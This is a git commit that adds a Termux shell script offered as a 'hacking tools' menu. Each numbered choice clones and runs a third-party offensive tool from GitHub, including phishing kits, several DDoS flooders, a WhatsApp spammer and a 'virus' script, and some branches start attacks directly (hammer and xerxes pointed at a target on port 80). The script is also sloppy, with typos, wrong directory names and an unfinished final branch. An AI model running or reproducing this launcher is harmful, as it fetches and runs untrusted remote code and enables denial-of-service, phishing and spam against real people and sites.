9a73c60973fcaf7cdd1a080a3b11c216f2fb15d8
HacketBoss <72526264+hackeratjeh@users.noreply.github.com>
2020-12-20 12:48:33 +0700

    Add files via upload

---
+++ Hacker_BossTools.sh
@@ -0,0 +1,192 @@
+bi='\33[34;1m' #biru
+hi='\33[32;1m' #hijau
+cy='\33[36;1m' #cyan
+pr='\33[35;1m' #purple
+me='\33[31;1m' #merah
+pu='\33[37;1m' #putih
+ku='\33[33;1m' #kuning
+
+echo""
+echo $ku"★▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●★"
+echo $pr" Author   ~~> Hacker Boss"
+echo $me" YouTube  ~~> Hacker Boss"
+echo $pu" Github   ~~> https://github.com/hackeratjeh"
+echo $cy" my_Group ~~> TERMUX_CYBER_TEAM"
+echo $bi"★▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●★"
+echo""
+echo $hi"       █████████
+      $pu █▄█████▄█        $me ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+       █ ▼▼▼▼▼  - _ --_--$hi ╔╦╗┌─┐┬─┐┬┌─
+       █    _-_-- -_ --__ $cy ║║├─┤├┬┘├┴┐─── $hi TOOLS
+       █ ▲▲▲▲▲ --  - _ -- ═╩╝┴ ┴┴└─┴ ┴   ╚ $me HackerBoss-(Hack)
+       █████████        $ku «==========✧==========»
+       ██ "
+echo "★▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●★"
+echo "[¤Φ¤] No system is safe to hack" $me By••Hacker_Boss
+echo "«==============®©===============»" | lolcat 
+date
+echo $bi" [1]•Evil-create-framework"
+echo $hi" [2]•Darknetv1"
+echo $cy" [3]•weeman"
+echo $pr" [4]•style"
+echo $me" [5]•RED_HAWK"
+echo $pu" [6]•hammer"
+echo $ku" [7]•lucita_ddos"
+echo $me" [8]•MrDdos"
+echo $pu" [9]•ddosWD"
+echo $ku" [10]•VA-DDOS"
+echo $cy" [11]•B-ATTACKING"
+echo $bi" [12]•xerxes"
+echo $hi" [13]•torshammer"
+echo $pu" [14]•LITEDDOS"
+echo $cy" [15]•Tool-X"
+echo $hi" [16]•terkey"
+echo $cy" [17]•Spam_wa"
+echo $ku" [18]•6VIRUS"
+echo $me" [19]•terkey"
+echo $cy"★▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●★"
+echo "••> PLEASE CHOOSE THE NUMBER THAT YOU INSTALL <••" | lolcat -a -d 100
+echo "=================================================" | lolcat -a -d 50
+echo "••> USE THIS TOOL WELL <••" | lolcat -a -d 100
+echo $pu"★▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●★"
+read -p " [HackTools] ••> " pil :
+#batas gen
+if [ $pil = 1 ]
+then
+git clone https://github.com/LOoLzeC/Evil-create-framework.git
+cd Evil-create-framework
+ls
+sh install.sh
+fi
+#batas gen
+if [ $pil = 2 ]
+then
+git clone https://github.com/AbyssExploit/Darknetv1
+cd Darknet1
+ls
+bash setup.sh
+fi
+#batas gen
+if [ $pil = 3 ]
+then
+git clone https://github.com/evait-security/weeman
+cd weeman
+python2 weeman.py
+fi
+#batas gen
+if [ $pil = 4 ]
+then
+git clone https://github.com/Din-zUgex95/style
+cd style
+python style.py
+fi
+#batas gen
+if [ $pil = 5 ]
+then
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+php RED_HAWK.php
+fi
+#batas gen
+if [ $pil = 6 ]
+then
+Git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+python hammer.py -s IP address -p 80 -t 135
+fi
+#batas gen
+if [ $pil = 7 ]
+then
+git clone https://github.com/zlucifer/lucita_ddos
+cd lucita_ddos
+ls
+python2 lucita_ddos.py
+fi
+#batas gen
+if [ $pil = 8 ]
+then
+git clone https://github.com/MrTamfanX/MrDdos
+cd MrDdos
+fi
+#batas gen
+if [ $pil = 9 ]
+then
+git clone https://github.com/banghyuu/ddosWD
+cd ddosWB
+fi
+#batas gen
+if [ $pil = 10 ]
+then
+git clone https://github.com/MiSetya/VA-DDOS
+cd VA-DDOS
+fi
+#batas gen
+if [ $pil = 11 ]
+then
+git clone https://github.com/BlackCyberAnonim/B-ATTACKING
+cd B-ATTACKING
+fi
+#batas gen
+if [ $pil = 12 ]
+then
+git clone https://github.com/zanyarjamal/xerxes
+cd xerxes
+clang xerxes.c -o xerxes
+chmod 777 xerxes
+./xerxes nama_website 80
+fi
+#batas gen
+if [ $pil = 13 ]
+then
+git clone https://github.com/dotfighter/torshammer.git
+cd torshammer
+python2 torshammer.py 
+fi
+#batas gen
+if [ $pil = 14 ]
+then
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 LITEDDOS.py
+fi
+#batas gen
+if [ $pil = 15 ]
+then
+git clone https://github.com/Rajkumrdusad/Tool-X.git
+cd Tool-X
+chmod +x install.aex
+sh install.aex
+fi
+#batas gen
+if [ $pil = 16 ]
+then
+git clone https://github.com/IntiTutorial/Virtex
+cd Virtex
+ls
+bash virtex.sh
+fi
+#batas gen
+if [ $pil = 17 ]
+then
+git clone https://github.com/RuangCoder/spam_wa
+cd spam_wa
+pyrhon2 wa.py
+fi
+#batas gen
+if [ $pil = 18 ]
+then
+git clone https://github.com/novalattasya/6VIRUS
+cd 6VIRUS
+bash 6VIRUS.sh
+fi
+#batas gen
+if [ $pil = 19 ]
+then
+git clone https://github.com/karjok/terkey
+cd terkey
+python terkey.py
+fi
+#batas gen
+if [ $pil = 20 ]
+then
